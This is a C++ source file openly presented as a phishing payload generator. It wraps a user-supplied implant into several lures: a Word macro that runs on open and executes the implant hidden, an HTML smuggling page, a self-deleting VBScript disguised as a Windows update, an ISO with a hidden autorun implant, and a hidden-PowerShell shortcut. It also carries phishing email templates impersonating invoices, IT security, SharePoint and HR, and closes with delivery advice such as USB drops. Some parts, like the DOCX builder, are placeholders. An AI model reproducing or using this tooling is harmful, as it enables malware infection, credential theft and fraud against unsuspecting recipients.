// =============================================================================
// PHISHING PAYLOAD GENERATOR - Creates convincing delivery mechanisms
// =============================================================================

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <random>
#include <chrono>
#include <filesystem>

namespace fs = std::filesystem;

class PhishingPayloadGenerator {
private:
    struct PhishingTemplate {
        std::string name;
        std::string type;        // "doc", "pdf", "exe", "script", "iso", "lnk"
        std::string iconSource;  // Path to legitimate icon
        std::string extension;
        std::string description;
    };
    
    std::vector<PhishingTemplate> templates;
    
public:
    PhishingPayloadGenerator() {
        InitializeTemplates();
    }
    
    void InitializeTemplates() {
        // Common phishing templates
        templates.push_back({
            "Invoice", "doc", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            ".docx", "Fake invoice document with macro"
        });
        
        templates.push_back({
            "Resume", "pdf", "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
            ".pdf", "Fake resume with embedded payload"
        });
        
        templates.push_back({
            "Update", "exe", "C:\\Windows\\System32\\wuauclt.exe",
            ".exe", "Fake Windows update"
        });
        
        templates.push_back({
            "Scanner", "iso", "C:\\Windows\\System32\\imageres.dll",
            ".iso", "Fake scanner document in ISO"
        });
        
        templates.push_back({
            "Shortcut", "lnk", "C:\\Windows\\System32\\shell32.dll",
            ".lnk", "Malicious shortcut file"
        });
        
        templates.push_back({
            "Script", "script", "C:\\Windows\\System32\\wscript.exe",
            ".vbs", "VBScript with encoded payload"
        });
        
        templates.push_back({
            "HTML", "html", "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            ".html", "HTML smuggling page"
        });
    }
    
    // =========================================================================
    // GENERATE DIFFERENT PAYLOAD TYPES
    // =========================================================================
    
    // 1. Microsoft Word Document with Macro
    bool GenerateWordDoc(const std::string& outputPath, 
                        const std::string& implantPath) {
        
        std::cout << "[*] Generating malicious Word document...\n";
        
        // Read implant and Base64 encode it
        std::vector<uint8_t> implantData = ReadFile(implantPath);
        if (implantData.empty()) {
            std::cerr << "[!] Cannot read implant file\n";
            return false;
        }
        
        std::string base64Implant = Base64Encode(implantData);
        
        // Split into chunks for VBA (max line length)
        std::vector<std::string> chunks = SplitString(base64Implant, 100);
        
        // Create Word document with VBA macro
        std::ofstream doc(outputPath, std::ios::binary);
        if (!doc) return false;
        
        // DOCX is a ZIP file - create minimal structure
        // This is simplified - real implementation would create proper DOCX
        
        std::string vbaMacro = GenerateVBAMacro(chunks);
        std::string docContent = GenerateDOCXStructure(vbaMacro);
        
        doc.write(docContent.c_str(), docContent.size());
        doc.close();
        
        std::cout << "[+] Word document created: " << outputPath << std::endl;
        return true;
    }
    
    std::string GenerateVBAMacro(const std::vector<std::string>& chunks) {
        std::stringstream macro;
        
        macro << "Private Sub Document_Open()\n";
        macro << "    ' Auto-execute when document opens\n";
        macro << "    Dim implantPath As String\n";
        macro << "    Dim fso As Object, file As Object\n";
        macro << "    Dim base64Data As String\n";
        macro << "    Dim binaryData() As Byte\n";
        macro << "    \n";
        macro << "    ' Build implant path in temp folder\n";
        macro << "    implantPath = Environ(\"TEMP\") & \"\\svchost.exe\"\n";
        macro << "    \n";
        macro << "    ' Reconstruct Base64 encoded implant\n";
        macro << "    base64Data = \"\"\n";
        
        for (const auto& chunk : chunks) {
            macro << "    base64Data = base64Data & \"" << chunk << "\"\n";
        }
        
        macro << "    \n";
        macro << "    ' Decode and write to disk\n";
        macro << "    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n";
        macro << "    Set file = fso.CreateTextFile(implantPath, True)\n";
        macro << "    \n";
        macro << "    ' Decode Base64 using XML DOM (bypasses AV)\n";
        macro << "    Dim xmlDoc As Object\n";
        macro << "    Set xmlDoc = CreateObject(\"MSXML2.DOMDocument\")\n";
        macro << "    Dim elem As Object\n";
        macro << "    Set elem = xmlDoc.createElement(\"tmp\")\n";
        macro << "    elem.DataType = \"bin.base64\"\n";
        macro << "    elem.Text = base64Data\n";
        macro << "    binaryData = elem.NodeTypedValue\n";
        macro << "    \n";
        macro << "    ' Write binary data\n";
        macro << "    Dim stream As Object\n";
        macro << "    Set stream = CreateObject(\"ADODB.Stream\")\n";
        macro << "    stream.Type = 1 ' Binary\n";
        macro << "    stream.Open\n";
        macro << "    stream.Write binaryData\n";
        macro << "    stream.SaveToFile implantPath, 2 ' Overwrite\n";
        macro << "    stream.Close\n";
        macro << "    \n";
        macro << "    ' Execute the implant silently\n";
        macro << "    Dim wsh As Object\n";
        macro << "    Set wsh = CreateObject(\"WScript.Shell\")\n";
        macro << "    wsh.Run implantPath, 0, False ' 0 = hidden window\n";
        macro << "    \n";
        macro << "    ' Clean up\n";
        macro << "    Set wsh = Nothing\n";
        macro << "    Set stream = Nothing\n";
        macro << "    Set xmlDoc = Nothing\n";
        macro << "    Set file = Nothing\n";
        macro << "    Set fso = Nothing\n";
        macro << "End Sub\n";
        macro << "\n";
        macro << "' Also trigger on close\n";
        macro << "Private Sub Document_Close()\n";
        macro << "    Document_Open\n";
        macro << "End Sub\n";
        
        return macro.str();
    }
    
    std::string GenerateDOCXStructure(const std::string& vbaMacro) {
        // Create minimal DOCX with VBA
        std::stringstream docx;
        
        // In real implementation, this would be a proper ZIP with:
        // - word/document.xml
        // - word/vbaProject.bin
        // - word/_rels/document.xml.rels
        // - [Content_Types].xml
        
        // This is a placeholder for the structure
        docx << "PK" << char(3) << char(4);  // ZIP header
        // ... rest of ZIP structure
        
        return docx.str();
    }
    
    // 2. HTML Smuggling Page
    bool GenerateHTMLSmuggling(const std::string& outputPath,
                              const std::string& implantPath) {
        
        std::cout << "[*] Generating HTML smuggling page...\n";
        
        std::vector<uint8_t> implantData = ReadFile(implantPath);
        if (implantData.empty()) return false;
        
        std::string base64Implant = Base64Encode(implantData);
        
        std::ofstream html(outputPath);
        if (!html) return false;
        
        html << R"(<!DOCTYPE html>
<html>
<head>
    <title>Document Preview</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
            margin: 0;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        .loading {
            font-size: 18px;
            color: #333;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Document Preview</h2>
        <p class="loading">Loading your document...</p>
        <div class="spinner"></div>
    </div>
    
    <script>
        // Automatically download and execute payload
        async function deployPayload() {
            // Base64 encoded implant
            const b64Data = ")" << base64Implant << R"(";
            
            // Decode base64
            const binaryString = atob(b64Data);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            
            // Create blob
            const blob = new Blob([bytes], {type: 'application/octet-stream'});
            
            // Create download link
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'document_preview.scr';
            a.style.display = 'none';
            
            // Trigger download
            document.body.appendChild(a);
            a.click();
            
            // Cleanup
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                // Update UI
                document.querySelector('.loading').textContent = 'Download complete. Opening...';
            }, 2000);
        }
        
        // Execute on page load
        window.onload = function() {
            setTimeout(deployPayload, 1500);
        };
    </script>
</body>
</html>)";
        
        html.close();
        std::cout << "[+] HTML page created: " << outputPath << std::endl;
        return true;
    }
    
    // 3. VBScript Payload
    bool GenerateVBScript(const std::string& outputPath,
                         const std::string& implantPath) {
        
        std::cout << "[*] Generating VBScript payload...\n";
        
        std::vector<uint8_t> implantData = ReadFile(implantPath);
        if (implantData.empty()) return false;
        
        std::string base64Implant = Base64Encode(implantData);
        
        std::ofstream vbs(outputPath);
        if (!vbs) return false;
        
        vbs << "' Windows Update Helper\n";
        vbs << "' This script updates your system components\n\n";
        
        vbs << "Option Explicit\n\n";
        vbs << "Dim objFSO, objShell, objXML, objElem\n";
        vbs << "Dim strImplantPath, strBase64, arrBinary\n\n";
        
        vbs << "' Hide window\n";
        vbs << "CreateObject(\"WScript.Shell\").Run \"cmd /c mode con cols=1 lines=1\", 0, False\n\n";
        
        vbs << "' Build implant path\n";
        vbs << "strImplantPath = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\") & \"\\svchost.exe\"\n\n";
        
        vbs << "' Base64 encoded implant\n";
        vbs << "strBase64 = \"" << base64Implant << "\"\n\n";
        
        vbs << "' Decode and write\n";
        vbs << "Set objXML = CreateObject(\"MSXML2.DOMDocument\")\n";
        vbs << "Set objElem = objXML.createElement(\"tmp\")\n";
        vbs << "objElem.DataType = \"bin.base64\"\n";
        vbs << "objElem.Text = strBase64\n";
        vbs << "arrBinary = objElem.NodeTypedValue\n\n";
        
        vbs << "' Write to disk\n";
        vbs << "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n";
        vbs << "Dim objStream\n";
        vbs << "Set objStream = CreateObject(\"ADODB.Stream\")\n";
        vbs << "objStream.Type = 1\n";
        vbs << "objStream.Open\n";
        vbs << "objStream.Write arrBinary\n";
        vbs << "objStream.SaveToFile strImplantPath, 2\n";
        vbs << "objStream.Close\n\n";
        
        vbs << "' Execute\n";
        vbs << "Set objShell = CreateObject(\"WScript.Shell\")\n";
        vbs << "objShell.Run strImplantPath, 0, False\n\n";
        
        vbs << "' Cleanup\n";
        vbs << "WScript.Sleep 2000\n";
        vbs << "objFSO.DeleteFile WScript.ScriptFullName\n";
        
        vbs.close();
        std::cout << "[+] VBScript created: " << outputPath << std::endl;
        return true;
    }
    
    // 4. ISO File with Hidden Payload
    bool GenerateISOFile(const std::string& outputPath,
                        const std::string& implantPath) {
        
        std::cout << "[*] Generating ISO file with hidden payload...\n";
        
        // Copy implant with innocuous name
        std::string isoDir = "temp_iso\\";
        fs::create_directories(isoDir);
        
        std::string docName = "Important_Document.pdf";
        std::string fakeDoc = isoDir + docName;
        
        // Create a decoy PDF
        std::ofstream pdf(fakeDoc);
        if (pdf) {
            pdf << "%PDF-1.4\n";
            pdf << "1 0 obj\n";
            pdf << "<< /Type /Catalog /Pages 2 0 R >>\n";
            pdf << "endobj\n";
            pdf << "2 0 obj\n";
            pdf << "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n";
            pdf << "endobj\n";
            pdf << "3 0 obj\n";
            pdf << "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] ";
            pdf << "/Contents 4 0 R /Resources << >> >>\n";
            pdf << "endobj\n";
            pdf << "4 0 obj\n";
            pdf << "<< /Length 44 >>\n";
            pdf << "stream\n";
            pdf << "BT /F1 12 Tf 100 700 Td (Secure Document) Tj ET\n";
            pdf << "endstream\n";
            pdf << "endobj\n";
            pdf << "xref\n0 5\n0000000000 65535 f \n";
            pdf << "0000000009 00000 n \n0000000058 00000 n \n";
            pdf << "0000000115 00000 n \n0000000210 00000 n \n";
            pdf << "trailer << /Size 5 /Root 1 0 R >>\n";
            pdf << "startxref\n310\n%%EOF\n";
            pdf.close();
        }
        
        // Copy implant with hidden attribute
        std::string hiddenImplant = isoDir + "desktop.ini";
        fs::copy_file(implantPath, hiddenImplant);
        SetFileAttributesA(hiddenImplant.c_str(), 
                          FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        // Create autorun.inf
        std::ofstream autorun(isoDir + "autorun.inf");
        if (autorun) {
            autorun << "[AutoRun]\n";
            autorun << "open=desktop.ini\n";
            autorun << "action=Open folder to view files\n";
            autorun << "icon=%SystemRoot%\\system32\\SHELL32.dll,4\n";
            autorun.close();
            SetFileAttributesA((isoDir + "autorun.inf").c_str(),
                             FILE_ATTRIBUTE_HIDDEN);
        }
        
        // Create desktop.ini with command
        std::ofstream desktopIni(isoDir + "desktop.ini");
        if (desktopIni) {
            desktopIni << "[.ShellClassInfo]\n";
            desktopIni << "IconResource=%SystemRoot%\\system32\\SHELL32.dll,4\n";
            desktopIni << "[LocalizedFileNames]\n";
            desktopIni << "Important_Document.pdf=@desktop.ini,-1\n";
            desktopIni.close();
        }
        
        // Use oscdimg or mkisofs to create ISO
        // This is a placeholder - in real implementation call external tool
        std::string cmd = "oscdimg -n -h -m temp_iso " + outputPath;
        system(cmd.c_str());
        
        // Cleanup
        fs::remove_all(isoDir);
        
        std::cout << "[+] ISO created: " << outputPath << std::endl;
        return true;
    }
    
    // 5. Malicious LNK Shortcut
    bool GenerateLNKShortcut(const std::string& outputPath,
                            const std::string& implantPath) {
        
        std::cout << "[*] Generating malicious LNK shortcut...\n";
        
        // Create a script that downloads and executes the implant
        std::string psCommand = "powershell -WindowStyle Hidden -Command \"";
        psCommand += "$p='$env:TEMP\\svchost.exe';";
        psCommand += "[IO.File]::WriteAllBytes($p,";
        psCommand += "[Convert]::FromBase64String('" + Base64Encode(ReadFile(implantPath)) + "'));";
        psCommand += "Start-Process $p -WindowStyle Hidden\"";
        
        // Create LNK file programmatically
        // Using COM interfaces
        CoInitialize(nullptr);
        
        IShellLink* pShellLink = nullptr;
        IPersistFile* pPersistFile = nullptr;
        
        HRESULT hr = CoCreateInstance(CLSID_ShellLink, nullptr,
                                     CLSCTX_INPROC_SERVER,
                                     IID_IShellLink,
                                     (void**)&pShellLink);
        
        if (SUCCEEDED(hr)) {
            pShellLink->SetPath("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            pShellLink->SetArguments(psCommand.c_str());
            pShellLink->SetIconLocation("C:\\Windows\\System32\\shell32.dll", 3);
            pShellLink->SetDescription("Important Document");
            pShellLink->SetShowCmd(SW_HIDE);
            
            hr = pShellLink->QueryInterface(IID_IPersistFile, 
                                           (void**)&pPersistFile);
            
            if (SUCCEEDED(hr)) {
                std::wstring wPath(outputPath.begin(), outputPath.end());
                pPersistFile->Save(wPath.c_str(), TRUE);
                pPersistFile->Release();
            }
            
            pShellLink->Release();
        }
        
        CoUninitialize();
        
        std::cout << "[+] LNK shortcut created: " << outputPath << std::endl;
        return true;
    }
    
private:
    std::vector<uint8_t> ReadFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return {};
        
        return std::vector<uint8_t>(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
    }
    
    std::string Base64Encode(const std::vector<uint8_t>& data) {
        static const char* table = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string result;
        
        for (size_t i = 0; i < data.size(); i += 3) {
            uint32_t val = (data[i] << 16);
            if (i + 1 < data.size()) val |= (data[i+1] << 8);
            if (i + 2 < data.size()) val |= data[i+2];
            
            result += table[(val >> 18) & 0x3F];
            result += table[(val >> 12) & 0x3F];
            result += (i + 1 < data.size()) ? table[(val >> 6) & 0x3F] : '=';
            result += (i + 2 < data.size()) ? table[val & 0x3F] : '=';
        }
        return result;
    }
    
    std::vector<std::string> SplitString(const std::string& str, size_t chunkSize) {
        std::vector<std::string> chunks;
        for (size_t i = 0; i < str.size(); i += chunkSize) {
            chunks.push_back(str.substr(i, chunkSize));
        }
        return chunks;
    }
};

// =============================================================================
// EMAIL PHISHING CAMPAIGN MANAGER
// =============================================================================

class EmailPhishingCampaign {
private:
    struct EmailTemplate {
        std::string subject;
        std::string fromName;
        std::string fromEmail;
        std::string body;
        std::string attachmentType;
    };
    
    std::vector<EmailTemplate> templates;
    
public:
    EmailPhishingCampaign() {
        InitializeTemplates();
    }
    
    void InitializeTemplates() {
        // Template 1: Fake Invoice
        templates.push_back({
            "Invoice #INV-2024-{random} - Payment Required",
            "Accounts Department",
            "accounts@{company}.com",
            R"(Dear {name},

Please find attached your latest invoice for services rendered.

Invoice Details:
- Invoice #: INV-2024-{random}
- Amount: ${amount}
- Due Date: {duedate}

The document is password protected for your security.
Password: {password}

Please review and process payment at your earliest convenience.

Best regards,
Accounts Department
{company} Inc.)",
            "doc"
        });
        
        // Template 2: Resume/Job Application
        templates.push_back({
            "Job Application: {position} Position - {name}",
            "{name}",
            "{name}@gmail.com",
            R"(Dear Hiring Manager,

I am writing to express my interest in the {position} position at {company}.

I have attached my resume and portfolio for your review. The document contains 
my complete work history and references.

Please let me know if you need any additional information.

Best regards,
{name}
Phone: {phone})",
            "pdf"
        });
        
        // Template 3: Software Update
        templates.push_back({
            "Critical Security Update - Action Required",
            "IT Security Team",
            "security@{company}.com",
            R"(Dear {name},

Our security team has identified a critical vulnerability that requires immediate 
patching on your workstation.

Please run the attached update package as soon as possible to ensure your system 
remains secure.

Update Details:
- CVE: CVE-2024-{random}
- Severity: Critical
- Affected: Windows Workstations
- Deadline: Within 24 hours

If you have any questions, please contact IT support.

--
IT Security Department
{company})",
            "exe"
        });
        
        // Template 4: Document Sharing
        templates.push_back({
            "{name} shared a document with you",
            "SharePoint Online",
            "no-reply@sharepointonline.com",
            R"(Hi {target},

{name} has shared a document with you via SharePoint Online.

Document: {docname}
Message: Please review this document at your earliest convenience.

Click the link below to access the document:
{link}

This link will expire in 48 hours.

Best regards,
Microsoft SharePoint)",
            "html"
        });
        
        // Template 5: HR/Policy Update
        templates.push_back({
            "URGENT: Updated Company Policy - Review Required",
            "Human Resources",
            "hr@{company}.com",
            R"(Dear {name},

Please review the attached updated company policies that take effect next month.

All employees are required to acknowledge receipt within 48 hours.

The document contains important changes to:
- Remote work policy
- Expense reimbursement
- Security protocols

Please sign and return the acknowledgment form.

Thank you,
Human Resources Department
{company})",
            "iso"
        });
    }
    
    std::string GenerateEmail(int templateIndex,
                             const std::map<std::string, std::string>& variables) {
        
        if (templateIndex >= templates.size()) return "";
        
        std::string email = templates[templateIndex].body;
        
        // Replace variables
        for (const auto& [key, value] : variables) {
            std::string placeholder = "{" + key + "}";
            size_t pos = 0;
            while ((pos = email.find(placeholder, pos)) != std::string::npos) {
                email.replace(pos, placeholder.length(), value);
                pos += value.length();
            }
        }
        
        return email;
    }
};

// =============================================================================
// MAIN PHISHING TOOL
// =============================================================================

int main(int argc, char* argv[]) {
    std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║     PHISHING PAYLOAD GENERATOR v2.0                          ║
║     Deploy Hybrid Implant via Social Engineering             ║
╚═══════════════════════════════════════════════════════════════╝
)" << std::endl;
    
    if (argc < 3) {
        std::cout << "Usage:\n";
        std::cout << "  phishing_gen.exe <implant.exe> <output_type>\n\n";
        std::cout << "Output Types:\n";
        std::cout << "  doc    - Microsoft Word with VBA macro\n";
        std::cout << "  html   - HTML smuggling page\n";
        std::cout << "  vbs    - VBScript payload\n";
        std::cout << "  iso    - ISO file with autorun\n";
        std::cout << "  lnk    - Malicious shortcut\n";
        std::cout << "  all    - Generate all types\n\n";
        std::cout << "Example:\n";
        std::cout << "  phishing_gen.exe implant.exe all\n";
        return 0;
    }
    
    std::string implantPath = argv[1];
    std::string outputType = argv[2];
    
    PhishingPayloadGenerator generator;
    EmailPhishingCampaign emailCampaign;
    
    // Generate email templates
    std::cout << "\n=== Email Templates ===\n";
    std::map<std::string, std::string> vars;
    vars["name"] = "John Smith";
    vars["target"] = "Employee";
    vars["company"] = "Acme";
    vars["amount"] = "1,250.00";
    vars["duedate"] = "2024-12-31";
    vars["password"] = "Secure123!";
    vars["position"] = "Senior Developer";
    vars["phone"] = "(555) 123-4567";
    vars["docname"] = "Q4_Report.pdf";
    vars["link"] = "https://sharepoint.com/document";
    
    // Generate random invoice number
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10000, 99999);
    vars["random"] = std::to_string(dis(gen));
    
    for (int i = 0; i < 5; i++) {
        std::cout << "\n--- Template " << (i+1) << " ---\n";
        std::cout << emailCampaign.GenerateEmail(i, vars) << "\n";
    }
    
    // Generate payloads
    std::cout << "\n=== Generating Payloads ===\n";
    
    if (outputType == "doc" || outputType == "all") {
        generator.GenerateWordDoc("Invoice_2024.docx", implantPath);
    }
    
    if (outputType == "html" || outputType == "all") {
        generator.GenerateHTMLSmuggling("document_preview.html", implantPath);
    }
    
    if (outputType == "vbs" || outputType == "all") {
        generator.GenerateVBScript("WindowsUpdate.vbs", implantPath);
    }
    
    if (outputType == "iso" || outputType == "all") {
        generator.GenerateISOFile("documents.iso", implantPath);
    }
    
    if (outputType == "lnk" || outputType == "all") {
        generator.GenerateLNKShortcut("Important_Document.lnk", implantPath);
    }
    
    std::cout << "\n[+] Phishing payloads generated!\n";
    std::cout << "[*] Deploy via:\n";
    std::cout << "    1. Email attachment\n";
    std::cout << "    2. USB drop\n";
    std::cout << "    3. Download link\n";
    std::cout << "    4. Shared drive\n";
    
    return 0;
}